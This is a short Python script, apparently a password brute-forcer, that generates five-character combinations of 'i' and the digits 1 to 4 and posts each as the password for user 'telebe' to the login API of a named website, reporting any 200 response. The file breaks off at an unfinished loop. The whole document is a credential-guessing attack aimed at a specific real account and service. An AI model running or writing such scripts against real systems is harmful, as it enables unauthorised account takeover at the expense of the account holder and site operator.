import requests
import threading
import string
import time
import itertools
my_list = ['i'] #list(string.ascii_lowercase)
numbers = ['1','2','3','4']
combine = itertools.chain(my_list, numbers)
comb = itertools.product(combine, repeat=5)
print(comb)
pasw = ''


def find(i):
    time.sleep(0.5)
    url = 'https://mars.se-pro.site/accounts/api/login/'
    password = ''.join(i)
    print(password)
    myobj = {'username':'telebe', 'password': password}
    post_r = requests.post(url, data = myobj)
    print('post_r.status_code', post_r.status_code)
    print('json', post_r.json())
    if(post_r.status_code==200):
        # pasw = i
        print(i)


for i in 

